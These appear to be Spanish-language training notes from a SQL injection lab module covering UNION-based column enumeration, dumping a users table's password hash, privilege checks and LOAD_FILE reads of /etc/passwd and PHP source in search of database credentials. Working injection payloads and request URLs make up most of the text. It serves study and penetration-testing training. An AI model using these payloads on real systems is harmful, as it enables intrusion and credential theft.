![](../../assets/images/SQLI/file-20260324130245070.jpg)

Tratamos de obtener el numero de columnas  UNION SELECT

``` sql
' UNION SELECT NULL-- -  ERROR
' UNION SELECT NULL,NULL-- - ERROR 
' UNION SELECT NULL,NULL,NULL,NULL-- - OK
' UNION SELECT NULL,NULL,NULL,NULL,NULL-- - ERROR
etc.`
```

![](../../assets/images/SQLI/file-20260324130545123.jpg)

Validamos donde se puede aplicar información o donde se puede visualizar información

![](../../assets/images/SQLI/file-20260324130909979.jpg)

Aplicamos la consulta que menciona en este caso  `user()`.

![](../../assets/images/SQLI/file-20260324131003488.jpg)

¿Cuál es el hash de la contraseña para 'newuser' almacenado en la tabla 'users' de la base de datos 'ilfreight'?

```c
http://154.57.164.75:32114/search.php?port_code=A%27%20UNION%20SELECT%20username,password,username,%27A%27%20FROM%20users%20--%20-
```

![](../../assets/images/SQLI/file-20260324131555390.jpg)

# Lectura de archivos

Además de recopilar datos de varias tablas y bases de datos dentro del sistema de gestión de bases de datos (DBMS), una inyección SQL también puede utilizarse para realizar muchas otras operaciones, como leer y escribir archivos en el servidor e incluso obtener la ejecución remota de código en el servidor back-end.

## Privilegios

La lectura de datos es mucho más común que la escritura de datos, que está estrictamente reservada para usuarios privilegiados en los sistemas de gestión de bases de datos modernos, ya que puede conducir a la explotación del sistema, como veremos. Por ejemplo, en `MySQL`, el usuario de la base de datos debe tener el `FILE`privilegio para cargar el contenido de un archivo en una tabla y luego extraer datos de esa tabla y leer archivos. Por lo tanto, comencemos recopilando información sobre nuestros privilegios de usuario dentro de la base de datos para decidir si leeremos y/o escribiremos archivos en el servidor back-end.

#### Usuario de la base de datos

Primero, debemos determinar qué usuario somos dentro de la base de datos. Si bien no necesariamente necesitamos privilegios de administrador de base de datos (DBA) para leer datos, esto se está volviendo cada vez más necesario en los sistemas de gestión de bases de datos (DBMS) modernos, ya que solo los DBA cuentan con dichos privilegios. Lo mismo se aplica a otras bases de datos comunes. Si tenemos privilegios de DBA, es mucho más probable que tengamos privilegios de lectura de archivos. Si no los tenemos, debemos verificar nuestros privilegios para ver qué podemos hacer. Para encontrar nuestro usuario actual de la base de datos, podemos usar cualquiera de las siguientes consultas:

```sql
SELECT USER() SELECT CURRENT_USER() SELECT user from mysql.user
```

Nuestro `UNION`La carga útil de inyección será la siguiente:

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

o:

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

Lo que nos indica nuestro usuario actual, que en este caso es `root`:

```sql
http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, user(), 3, 4-- -
```

![Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entry includes root@localhost, 3, and 4](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/db_user.jpg)

Esto es muy prometedor, ya que es probable que un usuario root sea un administrador de bases de datos (DBA), lo que nos otorga muchos privilegios.

#### Privilegios de usuario

Ahora que conocemos a nuestro usuario, podemos empezar a buscar qué privilegios tenemos con él. En primer lugar, podemos comprobar si tenemos privilegios de superadministrador con la siguiente consulta:

```sql
SELECT super_priv FROM mysql.user
```

Una vez más, podemos usar la siguiente carga útil con la consulta anterior:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

Si tuviéramos muchos usuarios dentro del DBMS, podríamos agregar `WHERE user="root"`mostrar privilegios solo para nuestro usuario actual `root`:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

```sql
http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

![Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entry includes root@localhost, 3, and 4](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/root_privs.jpg)

La consulta devuelve `Y`, lo que significa `YES`, lo que indica privilegios de superusuario. También podemos volcar otros privilegios que tenemos directamente desde el esquema, con la siguiente consulta:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

Desde aquí podemos añadir `WHERE grantee="'root'@'localhost'"`para mostrar solo a nuestro usuario actual `root`privilegios. Nuestra carga útil sería:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

Y vemos todos los privilegios posibles otorgados a nuestro usuario actual:

```sql
http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

![Search interface with a text box containing 'cn' UNION SELECT 1, grant' and a button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entries include 'root'@'localhost' with Port City values like SELECT, INSERT, UPDATE, and Port Volume 4](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/root_privs_2.jpg)

Vemos que el `FILE`Nuestro usuario cuenta con privilegios que le permiten leer archivos e incluso, potencialmente, escribirlos. Por lo tanto, podemos proceder a intentar leer los archivos.

---

## CARGAR_ARCHIVO

Ahora que sabemos que tenemos suficientes privilegios para leer archivos del sistema local, hagámoslo usando el `LOAD_FILE()`función. La [función LOAD_FILE()](https://mariadb.com/kb/en/load_file/) se puede utilizar en MariaDB / MySQL para leer datos de archivos. La función toma un solo argumento, que es el nombre del archivo. La siguiente consulta es un ejemplo de cómo leer el archivo. `/etc/passwd` archivo:

```sql
SELECT LOAD_FILE('/etc/passwd');
```

Nota: Solo podremos leer el archivo si el usuario del sistema operativo que ejecuta MySQL tiene los privilegios suficientes para leerlo.

De forma similar a como hemos estado utilizando un `UNION`inyección, podemos usar la consulta anterior:

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -
```

![Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entries include user information like root:x:0:0:root:/root:/bin/bash and daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/load_file_sqli.png)

Logramos leer con éxito el contenido del archivo passwd mediante inyección SQL. Desafortunadamente, esto también podría utilizarse para filtrar el código fuente de la aplicación.

---

## Otro ejemplo

Sabemos que la página actual es `search.php`. La raíz web predeterminada de Apache es `/var/www/html`Intentemos leer el código fuente del archivo en `/var/www/html/search.php`.

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, LOAD_FILE('/var/www/html/search.php'), 3, 4-- -
```

![Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/load_file_search.png)

Sin embargo, la página termina renderizando el código HTML dentro del navegador. El código fuente HTML se puede ver pulsando `[Ctrl + U]`.

![PHP code snippet for querying a database. It checks if 'port_code' is set, constructs a SQL query to select from 'ports' where code matches, executes the query, and fetches results](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/load_file_source.png)

El código fuente nos muestra todo el código PHP, que podría ser examinado con mayor detalle para encontrar información confidencial, como las credenciales de conexión a la base de datos, o para detectar más vulnerabilidades.

## Laboratorio 
En el código PHP anterior, observamos que '$conn' no está definido, por lo que debe importarse mediante el comando include de PHP. Consulta la página importada para obtener la contraseña de la base de datos.